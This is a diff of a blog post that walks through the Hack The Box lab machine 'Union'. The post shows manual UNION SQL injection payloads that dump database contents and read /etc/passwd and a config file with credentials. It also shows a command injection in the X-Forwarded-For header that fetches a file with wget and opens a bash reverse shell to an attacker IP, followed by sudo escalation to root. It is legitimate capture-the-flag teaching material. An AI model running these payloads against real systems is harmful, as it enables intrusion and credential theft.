@@ -1,14 +1,12 @@
 ---
 title: "Union Walkthrough(HTB)"
-date: 2025-03-12
-draft: true
+date: 2025-03-16
+draft: false 
 description: "Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses."
-tags: ["medium", "Windows", "HTB", "hacking", "Active Directory", "Walkthrough"]
-series: ["Hack The Box"]
-series_order: 5
+tags: ["medium", "Linux", "HTB", "hacking", "Web", "Walkthrough"]
 ---
-## Reconnaissance & Enumeration Linux 
-- nmap scan results 
+## Reconnaissance & Enumeration  
+- Nmap scan results 
 ```
 PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
@@ -21,32 +19,35 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 ```
-- Interesting isn't it, that we only got port 80 open
-- From the session cookie we can learn that, It's running using PHP
-- Fired up a subdomain scan and got no  results
-- ![[Pasted image 20250113000957.png]]
-- As this is a PHP ran web I fired up a directory fuzzing with extension `.php`
-```
+- Interesting isn't it, we got only one port-80 open
+- In the scan itslef we can see the `PHPSESSID` cookie, So, this is a PHP made website
+- I eventually got bored looking at the website so fired up a subdomain scan and got no results
+![Pasted image 20250113000957.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113000957.png?raw=true)
+- After many unsuccessful attempts, as this is a PHP website I convinced myself to run a directory fuzzing with php extension 
+```bash
 ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t 60
 ```
-- Got some results
-- ![[Pasted image 20250113001145.png]]
-- Cannot access the `/firewall.php` page
-- The website have a Username check option if the username valid or did not present on the database It will provide a link to `challenge.php` where have to submit some kind of flag
-- This parameter seems to be vulnerable to #SQLi . When I provide this payload I am getting different error
-```
+- Got some interesting results
+![Pasted image 20250113001145.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true)
+- `firewall.php` seems interesting but on accessing the page it's throwing errors, just now I was happy
+![joy-killer](https://media1.tenor.com/m/bKuF5df_YnkAAAAd/samob%C3%B3jstwo-cyanide-and-happiness.gif)
+- This website has a Username check option if the username is valid or did not present in the database then It will provide a link to `challenge.php`, there we have to submit some kind of flag. This is how the website works
+- This username check parameter seems to be vulnerable to SQL injection. If you have no idea about SQL Injection, I have a small post for that, first check that and then come back here.
+{{< article link="/Secure-The-Throne/posts/1741343014156-sql-injection/" >}}  
+- When I input this payload I got different error
+```sql
 'OR 1=1; -- -
 ```
-- ![[Pasted image 20250113001954.png]]
-- As firewall is running SQLMap not working so have to play manually
-- Got a Interesting response for this payload
-```
+![Pasted image 20250113001954.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true)
+- There is a firewall running on this web page so SQLMap will not work, Thus we have to do all the work manually
+![too-much-of-work](https://media1.tenor.com/m/o6gmreNhiwwAAAAC/so-much-to-do-too-much-to-do.gif) 
+- While I was spamming with SQLi payloads I got an Interesting response for this payload
+```SQL
 ' UNION select user(); -- -
 ```
-- ![[Pasted image 20250113002241.png]]
-
-- Info about databases
-```payload
+![Pasted image 20250113002241.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113002241.png?raw=true)
+- To get the Info about databases, We can use this payload
+```SQL
 ' UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- -
 ```
 - **Output:**
@@ -54,8 +55,9 @@ ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Con
 Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
 ```
 
-- We got five databases but `november` seems more interesting
-```
+- We got five databases in the corresponding response but `november` seems more interesting, So lets see what's inside of it
+![whats-inside](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHRzNHNkZ2hvejg0aWN1YnljYXN5dHF2OTNsdTBjMjZqOHQ3ajBmaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/KtJJVm1owcKs0Pil78/giphy.gif)
+```sql
 ' UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november'; -- -
 ```
 - **Output:**
@@ -63,8 +65,8 @@ Sorry, mysql,information_schema,performance_schema,sys,november you are not elig
 Sorry, flag,players you are not eligible due to already qualifying.
 ```
 
-- `november` database has two tables
-```
+- We got what we needed `november` database has two tables, lets go further in
+```sql
 ' UNION select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='november'; -- -
 ```
 - **Output:**
@@ -72,7 +74,7 @@ Sorry, flag,players you are not eligible due to already qualifying.
 Sorry, flag:one,players:player you are not eligible due to already qualifying.
 ```
 
-- Each had only one column so password column I guess. Going for `flag` table for now
+- Each of the tables had only one column. For now I am going for `flag` table. Let's see...
 ```
 ' UNION select group_concat(one) from flag; -- -
 ```
@@ -80,9 +82,9 @@ Sorry, flag:one,players:player you are not eligible due to already qualifying.
 ```
 Sorry, <redacted> you are not eligible due to already qualifying.
 ```
-- Got the flag and after submission of the flag to website firewalls lifted and port 22 is now accessible
-- ![[Pasted image 20250113003834.png]]
-- nmap scan result for port 22
+- I Got the flag not the HTB user flag but the platform flag for this box and after submission of the flag, the website firewalls lifted and port 22 is now accessible
+![Pasted image 20250113003834.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113003834.png?raw=true)
+- Lets confirm this by a simple nmap scan on port `22`
 ```
 ❯ nmap -p 22 -A 10.10.11.128                            
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST
@@ -98,8 +100,8 @@ PORT   STATE SERVICE VERSION
 
 ```
 
-- Got the users info
-```
+- Ok now let's continue with the SQLi, first I checked for the other tables and got the users info
+```sql
 ' UNION select group_concat(player) from players; -- -
 ```
 - **Output:**
@@ -108,8 +110,8 @@ Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already 
 ```
 ## Exploitation
 
-- Got the `/etc/passwd` file data
-```
+- This is one of the reasons why sql injection is so dangerous we can read system files using SQLi if it's misconfigured. Using the below payload I got the `/etc/passwd` file data
+```sql
 ' UNION select load_file('/etc/passwd'); -- -
 ```
 - **Output:**
@@ -151,14 +153,14 @@ mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
 uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
  you are not eligible due to already qualifying.
 ```
-- Found three valid users to access the system
+- From reading the `/etc/passwd` file I identified three valid users to access the system
 
-- Can also read the source code of the page
-```
+- We can also read the source code of this page
+```sql
 ' UNION select load_file('/var/www/html/index.php'); -- -
 ```
-- As we found the `config.php` via the directory fuzzing let's try getting it
-```
+- If you remember earlier we found `config.php` via the directory fuzzing, so let's try getting it
+```sql
 ' UNION select load_file('/var/www/html/config.php'); -- -
 ```
 - **Output:**
@@ -174,11 +176,12 @@ Sorry, <?php
 ?>
  you are not eligible due to already qualifying.
 ```
-- Accessed SSH and got the user flag
-- ![[Pasted image 20250113005214.png]]
+- We got the exposed password from the website configuration. Accessed the system using SSH and got the {{< keyword >}} user flag {{< /keyword >}}
+![Pasted image 20250113005214.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113005214.png?raw=true)
+
 ## Privilege Escalation
-- Looked onto the `firewall.php` code
-```
+- Quickly I started enumerating and eventually looked into the `firewall.php` code and I can see the vulnerable code
+```php
 <?php
   if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
     $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
@@ -188,34 +191,37 @@ Sorry, <?php
   system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
 ?>
 ```
-- This above part is vulnerable to command Injection
-- Tested with this header payload and it worked
-```
+- This above part is vulnerable to command Injection, after a while I pictured the payload and I tested with this header payload and it worked
+```bash
 X-FORWARDED-FOR: 8.8.8.8; wget http://10.10.14.4:8000/Union_AllPorts.txt;
 ```
-- ![[Pasted image 20250113011912.png]]
-- Got a shell with this 
-```
+![Pasted image 20250113011912.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113011912.png?raw=true)
+- Prepared a reverse shell payload and got the shell with this 
+```bash
 X-FORWARDED-FOR: 8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/6001 <&1';
 ```
-- Upgraded the shell to be more stable using new technique
-```
+- Upgraded the shell to be more stable using a new technique that I have learnt recently
+```bash
 script /dev/null -c bash
 ```
 - Then foreground the shell with `CTRL+Z`
-```
+```bash
 stty raw -echo; fg
 ```
-- In the shell type this
-```
+- In the shell type this to allign it with our terminal
+```bash
 reset
 ```
 - Now the shell is upgraded
 - Issued this command `sudo -l` and found that `sudo` can be run with anything
-- ![[Pasted image 20250113012401.png]]
-- So exploited it using 
+![Pasted image 20250113012401.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012401.png?raw=true)
+- Now easily ran the bash with root privileges  
 ```
 sudo /bin/bash
 ```
-- Got the root flag.
-- ![[Pasted image 20250113012505.png]]
+- Got the {{< keyword >}} Root flag {{< /keyword >}}
+![Pasted image 20250113012505.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012505.png?raw=true)
+
+{{< typeit >}} This was a short box interms of my walkthrough. Anyway, see you again nextime...... {{< /typeit >}}
+
+![end](https://media1.tenor.com/m/ORShRT5zN1MAAAAC/we%27ll-see-you-next-time-samus-paulicelli.gif)
